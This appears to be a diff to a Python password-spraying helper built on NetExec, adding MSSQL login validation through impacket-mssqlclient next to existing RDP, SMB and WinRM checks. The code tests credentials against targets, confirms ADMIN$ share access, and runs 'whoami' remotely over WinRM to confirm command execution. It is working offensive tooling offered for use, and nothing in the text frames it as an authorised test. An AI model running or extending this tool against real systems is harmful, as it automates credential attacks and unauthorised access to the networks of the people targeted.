@@ -52,6 +52,9 @@ def extract_success(output):
 # =====================
 def validate_access(proto, target, user, password):
     try:
+        # -----------------
+        # RDP
+        # -----------------
         if proto == "rdp":
             cmd = [
                 "xfreerdp3",
@@ -66,6 +69,9 @@ def validate_access(proto, target, user, password):
             if result.returncode == 0:
                 return True, "RDP login confirmed"
 
+        # -----------------
+        # SMB
+        # -----------------
         elif proto == "smb":
             cmd = ["nxc", "smb", target, "-u", user, "-p", password, "--shares"]
             result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
@@ -73,12 +79,63 @@ def validate_access(proto, target, user, password):
             if "ADMIN$" in result.stdout:
                 return True, "ADMIN$ access confirmed"
 
+        # -----------------
+        # WINRM
+        # -----------------
         elif proto == "winrm":
             cmd = ["nxc", "winrm", target, "-u", user, "-p", password, "-x", "whoami"]
             result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
 
             if user.lower() in result.stdout.lower():
                 return True, "Command execution confirmed"
+
+        # -----------------
+        # MSSQL (NEW)
+        # -----------------
+        elif proto == "mssql":
+            # Try Windows Authentication first
+            cmd = [
+                "impacket-mssqlclient",
+                f"{user}:{password}@{target}",
+                "-windows-auth"
+            ]
+
+            result = subprocess.run(
+                cmd,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                text=True,
+                timeout=10
+            )
+
+            output = result.stdout + result.stderr
+
+            if "Login failed" not in output and "authentication failed" not in output.lower():
+                return True, "MSSQL login confirmed (Windows auth)"
+
+            # Fallback to SQL Authentication
+            cmd = [
+                "impacket-mssqlclient",
+                f"{user}:{password}@{target}"
+            ]
+
+            result = subprocess.run(
+                cmd,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                text=True,
+                timeout=10
+            )
+
+            output = result.stdout + result.stderr
+
+            if "Login failed" not in output and "authentication failed" not in output.lower():
+                return True, "MSSQL login confirmed (SQL auth)"
+
+            return False, "MSSQL auth failed"
+
+    except subprocess.TimeoutExpired:
+        return False, "Validation timeout"
 
     except Exception as e:
         return False, f"Validation error: {e}"
@@ -107,7 +164,7 @@ def explain_failure(output):
 # =====================
 def main():
     parser = argparse.ArgumentParser(
-        description="NetExec multi-protocol password spraying helper (v2)"
+        description="NetExec multi-protocol password spraying helper (v3)"
     )
 
     parser.add_argument("protocols", help="Comma-separated protocols or 'all'")
@@ -123,7 +180,7 @@ def main():
 
     # NEW FLAGS
     parser.add_argument("--validate", action="store_true",
-                        help="Validate real access (RDP/SMB/WinRM)")
+                        help="Validate real access (RDP/SMB/WinRM/MSSQL)")
     parser.add_argument("--only-access", action="store_true",
                         help="Only show confirmed access")
 
@@ -183,7 +240,6 @@ def main():
                         else:
                             validation_msg = f" ({msg})"
 
-                    # ONLY ACCESS FILTER
                     if args.only_access and tag != "[ACCESS]":
                         continue
 
